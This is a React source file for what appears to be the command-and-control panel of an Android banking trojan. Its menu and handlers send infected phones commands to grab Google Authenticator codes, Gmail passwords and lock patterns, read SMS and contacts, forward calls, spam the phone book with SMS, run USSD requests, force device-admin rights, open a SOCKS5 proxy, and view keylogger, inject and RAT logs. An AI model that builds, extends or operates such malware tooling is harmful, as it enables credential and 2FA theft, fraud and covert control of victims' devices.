import React from 'react';
import BotsTable from '../Controls/client_table/BotsTable';
import SettingsContext from '../Settings';
import BotSettingsModal from '../Controls/Modals/BotSettingsModal';
import LogsDevice from '../Controls/Modals/LogsDevice';
import LogsKeylogger from '../Controls/Modals/LogsKeylogger';
import LogsModal from '../Controls/Modals/LogsModal';
import RatModal from '../Controls/Modals/RatModal';
import CommandsList from '../Controls/Commands/CommandsList';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';

import BotSortModal from '../Controls/Modals/BotSortModal';
import { try_eval } from '../serviceF';
import LogsInjects from '../Controls/Modals/LogsInjects';


class BotsList extends React.Component {
    constructor(props) {
        super(props)
        this.BotListForceUpdate = this.BotListForceUpdate.bind(this)
    }

    BotListForceUpdate() {
        this.forceUpdate();
      
    }

    deleteSelectedBots() { // TODO: Callback to refresh table after fetch
       
        let botsList = '';
        SettingsContext.SelectedBots.forEach(function(element) {
            botsList += element + ',';
        }); 

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: { // hash - trash!
                'params': new Buffer('{"sent_request":"remove_bot","ID":"' + botsList.substring(0, botsList.length - 1) + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
                    try_eval('$.notify("The device is removed", "info");');
					SettingsContext.CurrentSetBot = '';
					SettingsContext.UpdateTable();
					this.forceUpdate();
				}
            }
            catch (ErrMgs) {
               // SettingsContext.ShowToastTitle('error', 'ERROR', 'Error deleteBots command. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }
    onClickGrabbingGoogleAuth2 = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"cmd":"grabbing_google_authenticator2"}');
            try_eval('$.notify("Added command [grabbing_google_authenticator2]", "info");');
        }
    }
    onClickRemoveBotDevice = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"cmd":"remove_bot"}');
            try_eval('$.notify("Added command [remove_bot]", "info");');
        }
    }
    onClickCleanCache = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"cmd":"clean_cache"}');
          try_eval('$.notify("Added command [clean_cache]", "info");');
        }
    }
    onClickUpdateModule = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"cmd":"patch_update"}');
          try_eval('$.notify("Added command [patch_update]", "info");');
        }
    }
    OnClickSendAutoPush = (e) => {
        SettingsContext.BotSendCommand('{"cmd":"notification_a"}');
        try_eval('$.notify("Added command [notification_a]", "info");');
    }

    // onClickGetContacts = (e) => {
    //     SettingsContext.BotSendCommandCallBack('{"cmd":"saved_contacts"}', this.ProcessInfo);
    //     try_eval('$.notify("Added command [saved_contacts]", "info");');
    // }

    // onClickGetApps = (e) => {
    //     SettingsContext.BotSendCommandCallBack('{"cmd":"installed_apps"}', this.ProcessInfo);
    //     try_eval('$.notify("Added command [installed_apps]", "info");');
    // }

    // onClickGetSMS = (e) => {
    //     SettingsContext.BotSendCommandCallBack('{"cmd":"saved_sms"}', this.ProcessInfo);
    //     try_eval('$.notify("Added command [saved_sms]", "info");');
    // }

    onGetDataLogs = (e) => {
        SettingsContext.BotSendCommandCallBack('{"cmd":"get_data_logs"}', this.ProcessInfo);
        try_eval('$.notify("Added command [get_data_logs]", "info");');
    }

    admin_device = (e) => {
        SettingsContext.BotSendCommandCallBack('{"cmd":"run_admin_device"}', this.ProcessInfo);
        try_eval('$.notify("Added command [run_admin_device]", "info");');
    }
    update_inject = (e) => {
        SettingsContext.BotSendCommandCallBack('{"cmd":"update_inject"}', this.ProcessInfo);
        try_eval('$.notify("Added command [update_inject]", "info");');
    }
    request_permission =  (e) => {
        SettingsContext.BotSendCommandCallBack('{"cmd":"request_permission"}', this.ProcessInfo);
        try_eval('$.notify("Added command [request_permission]", "info");');
    }
    access_notifications =  (e) => {
        SettingsContext.BotSendCommandCallBack('{"cmd":"access_notifications"}', this.ProcessInfo);
        try_eval('$.notify("Added command [access_notifications]", "info");');
    }
    get_all_permission =  (e) => {
        SettingsContext.BotSendCommandCallBack('{"cmd":"get_all_permission"}', this.ProcessInfo);
        try_eval('$.notify("Added command [get_all_permission]", "info");');
    }
    stop_socks5 =  (e) => {
        SettingsContext.BotSendCommandCallBack('{"cmd":"stop_socks5"}', this.ProcessInfo);
        try_eval('$.notify("Added command [stop_socks5]", "info");');
    }

    render () {
        return (
            <div>
                 
                <BotSortModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                 
                <table id="tableButton" style={({width:'100%',marginBottom:'10px'})}>
                        <tr>
                            <td>
                                <div class="btnCommands dropdown open">                               
                                     <a class="aButton fab fa-free-code-camp btn btn-outline-primary dropdown-toggle"  data-toggle="dropdown"> Commands</a>
                                    <button type="button" onClick={this.deleteSelectedBots.bind(this)} class="fa fa-trash btn btn-outline-danger btnRemove"> Remove</button>
                                    <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalSendSMS">Send SMS</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalSendSMSMailing">Mailing SMS</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalUSSD">Run USSD request</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalPushNotification">Send push notification</a>
                                        <a class="dropdown-item" onClick={this.OnClickSendAutoPush}>Send auto push notification</a>
                                        {/* <a class="dropdown-item" data-toggle="modal" data-target="#modalOpenFakePageInjection">Open fake page injection</a> */}
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalForwardingCall">Run forwarding call</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalRunApp">Run application</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalOpenURL">Open URL browser</a>
                                        <a class="dropdown-item" onClick={this.onClickGrabbingGoogleAuth2} >Run grabbing logs google authenticator2</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalSMSSpam">SMS mailing on the phone book</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalChangeUrls">Change URL connecting</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#recordAudio">Run record audio</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalgrabbing_lockpattern">Run grabbing pattern lock</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalgrabbing_pass_gmail">Run grabbing password gmail</a>
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalSocks5">Run socks5</a>
                                        <a class="dropdown-item" onClick={this.stop_socks5}>Stop socks5</a>
                                        <a class="dropdown-item" onClick={this.onGetDataLogs}>Get data device<br/>(saved sms, contacts, installed application)</a>
                                        <a class="dropdown-item" onClick={this.admin_device}>Enable admin device</a>
                                        <a class="dropdown-item" onClick={this.request_permission}>Run permission request</a>
                                        <a class="dropdown-item" onClick={this.access_notifications}>Run permission access to notification</a>
                                        <a class="dropdown-item" onClick={this.get_all_permission}>Get all permissions</a>
                                        {/* <a class="dropdown-item" onClick={this.onClickGetContacts}>Get contacts</a>
                                        <a class="dropdown-item" onClick={this.onClickGetSMS}>Get all saved SMS</a>
                                        <a class="dropdown-item" onClick={this.onClickGetApps}>Get all installed applications</a> */}
                                        <a class="dropdown-item" data-toggle="modal" data-target="#modalDeleteApp">Remove application</a>
                                        <a class="dropdown-item" onClick={this.update_inject}>Run update list injects</a>
                                        <a class="dropdown-item" onClick={this.onClickRemoveBotDevice} >Remove a bot from the device</a>
                                        <a class="dropdown-item" onClick={this.onClickCleanCache} >Clear the log cache</a>
                                      { <a class="dropdown-item" onClick={this.onClickUpdateModule}>Update the new patch</a> }
                                    </div>
                                </div>
                         </td>
                        </tr>
                </table>
                <BotsTable BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.UpdateTableHash}/>
                <BotSettingsModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <LogsModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <LogsInjects BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <LogsKeylogger BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <LogsDevice BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <RatModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <CommandsList />

            <center>
                    <div class='footer'>
                       
                  <span>
                      
                    <a class="parmFooter far fa-paper-plane"  data-toggle="modal" data-target="#modalSendSMS" style={({marginLeft: '-320px'})}><br/>
                    <a style={({marginLeft: '-15px'})}class="parmFooter2">SMS</a>
                    </a>
                    </span>
                    <a class="parmFooter far fa-hashtag"  data-toggle="modal" data-target="#modalUSSD" style={({marginLeft: '-240px'})} ><br/>
                    <a style={({marginLeft: '-20px'})} class="parmFooter2">USSD</a>
                    </a>
                   
                    <a class="parmFooter far fa-upload"   onClick={this.onGetDataLogs} style={({marginLeft: '-150px'})} ><br/>
                    <a style={({marginLeft: '-38px', bottom: '5px'})} class="parmFooter2">Get<br/>Data Device</a>
                    </a>
                    <a class="parmFooter far fa-envelope"  data-toggle="modal" data-target="#modalSMSSpam" style={({marginLeft: '-60px'})} ><br/>
                    <a style={({marginLeft: '-23px', bottom: '5px'})} class="parmFooter2">SMS<br/>Mailing</a>
                    </a>

                    <a class="parmFooter far fa-mobile-android" data-toggle="modal" data-target="#modalForwardingCall" style={({marginLeft: '30px'})} ><br/>
                    <a style={({marginLeft: '-35px', bottom: '5px'})} class="parmFooter2">Call<br/>Forwarding</a>
                    </a>

                    <a class="parmFooter far fa-user-crown"  onClick={this.admin_device} style={({marginLeft: '120px'})} ><br/>
                    <a style={({marginLeft: '-21px', bottom: '5px'})} class="parmFooter2">Admin<br/>Device</a>
                    </a>

                    <a class="parmFooter far fa-university" data-toggle="modal" data-target="#modalPushNotification"   style={({marginLeft: '210px'})} ><br/>
                    <a style={({marginLeft: '-35px'})} class="parmFooter2">Notification</a>
                    </a>

                    <a class="parmFooter far fa-times" onClick={this.onClickRemoveBotDevice} style={({marginLeft: '300px'})} ><br/>
                    <a style={({marginLeft: '-33px'})} class="parmFooter2">Remove Bot</a>
                    </a>

                  </div>   </center>
            </div>
         
        );
    }
}

export default BotsList;